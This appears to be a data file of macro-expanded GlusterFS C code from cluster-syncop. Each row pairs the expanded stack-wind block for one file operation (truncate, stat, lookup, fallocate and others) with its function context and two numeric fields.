2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->truncate_cbk) tmp_cbk = cluster_truncate_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->truncate""; _new->unwind_to = ""cluster_truncate_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->truncate_cbk = cluster_truncate_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->truncate); subvols[__i]->fops->truncate (_new, subvols[__i], loc, offset, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                  dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->truncate_cbk) tmp_cbk = cluster_truncate_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->truncate""; _new->unwind_to = ""cluster_truncate_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->truncate_cbk = cluster_truncate_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->truncate); subvols[__i]->fops->truncate (_new, subvols[__i], loc, offset, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                  ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->stat_cbk) tmp_cbk = cluster_stat_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->stat""; _new->unwind_to = ""cluster_stat_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->stat_cbk = cluster_stat_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->stat); subvols[__i]->fops->stat (_new, subvols[__i], loc, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"              call_frame_t *frame, xlator_t *this, loc_t *loc, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->stat_cbk) tmp_cbk = cluster_stat_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->stat""; _new->unwind_to = ""cluster_stat_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->stat_cbk = cluster_stat_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->stat); subvols[__i]->fops->stat (_new, subvols[__i], loc, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                          ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->lookup_cbk) tmp_cbk = cluster_lookup_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->lookup""; _new->unwind_to = ""cluster_lookup_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->lookup_cbk = cluster_lookup_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->lookup); subvols[__i]->fops->lookup (_new, subvols[__i], loc, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                call_frame_t *frame, xlator_t *this, loc_t *loc, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->lookup_cbk) tmp_cbk = cluster_lookup_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->lookup""; _new->unwind_to = ""cluster_lookup_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->lookup_cbk = cluster_lookup_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->lookup); subvols[__i]->fops->lookup (_new, subvols[__i], loc, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                          ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fsetattr_cbk) tmp_cbk = cluster_fsetattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fsetattr""; _new->unwind_to = ""cluster_fsetattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fsetattr_cbk = cluster_fsetattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fsetattr); subvols[__i]->fops->fsetattr (_new, subvols[__i], fd, stbuf, valid, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                  struct iatt *stbuf, int32_t valid, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fsetattr_cbk) tmp_cbk = cluster_fsetattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fsetattr""; _new->unwind_to = ""cluster_fsetattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fsetattr_cbk = cluster_fsetattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fsetattr); subvols[__i]->fops->fsetattr (_new, subvols[__i], fd, stbuf, valid, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                        ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fallocate_cbk) tmp_cbk = cluster_fallocate_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fallocate""; _new->unwind_to = ""cluster_fallocate_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fallocate_cbk = cluster_fallocate_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fallocate); subvols[__i]->fops->fallocate (_new, subvols[__i], fd, keep_size, offset, len, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                   int32_t keep_size, off_t offset, size_t len, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fallocate_cbk) tmp_cbk = cluster_fallocate_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fallocate""; _new->unwind_to = ""cluster_fallocate_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fallocate_cbk = cluster_fallocate_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fallocate); subvols[__i]->fops->fallocate (_new, subvols[__i], fd, keep_size, offset, len, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                                 ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->discard_cbk) tmp_cbk = cluster_discard_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->discard""; _new->unwind_to = ""cluster_discard_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->discard_cbk = cluster_discard_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->discard); subvols[__i]->fops->discard (_new, subvols[__i], fd, offset, len, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                 off_t offset, size_t len, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->discard_cbk) tmp_cbk = cluster_discard_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->discard""; _new->unwind_to = ""cluster_discard_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->discard_cbk = cluster_discard_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->discard); subvols[__i]->fops->discard (_new, subvols[__i], fd, offset, len, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                      ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->zerofill_cbk) tmp_cbk = cluster_zerofill_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->zerofill""; _new->unwind_to = ""cluster_zerofill_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->zerofill_cbk = cluster_zerofill_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->zerofill); subvols[__i]->fops->zerofill (_new, subvols[__i], fd, offset, len, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                 off_t offset, off_t len, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->zerofill_cbk) tmp_cbk = cluster_zerofill_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->zerofill""; _new->unwind_to = ""cluster_zerofill_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->zerofill_cbk = cluster_zerofill_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->zerofill); subvols[__i]->fops->zerofill (_new, subvols[__i], fd, offset, len, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                      ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->ipc_cbk) tmp_cbk = cluster_ipc_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->ipc""; _new->unwind_to = ""cluster_ipc_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->ipc_cbk = cluster_ipc_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->ipc); subvols[__i]->fops->ipc (_new, subvols[__i], op, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0);",120,1,"             call_frame_t *frame, xlator_t *this, int32_t op, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->ipc_cbk) tmp_cbk = cluster_ipc_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->ipc""; _new->unwind_to = ""cluster_ipc_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->ipc_cbk = cluster_ipc_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->ipc); subvols[__i]->fops->ipc (_new, subvols[__i], op, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0);
        return fop_success_fill (replies, numsubvols, output);
}
"
